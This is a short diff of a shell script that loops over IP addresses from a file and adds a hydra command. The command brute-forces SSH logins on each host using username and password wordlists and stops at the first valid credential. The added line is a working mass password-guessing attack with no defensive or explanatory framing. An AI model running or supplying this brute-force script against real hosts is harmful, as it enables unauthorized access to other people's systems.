@@ -3,7 +3,7 @@
 
 for i in `cat ip.txt`
 do
-        echo $i
-       
+       echo $i
+       hydra $i ssh -s 22 -L usuarios.txt -P claves.txt -f -t 3
 done
     
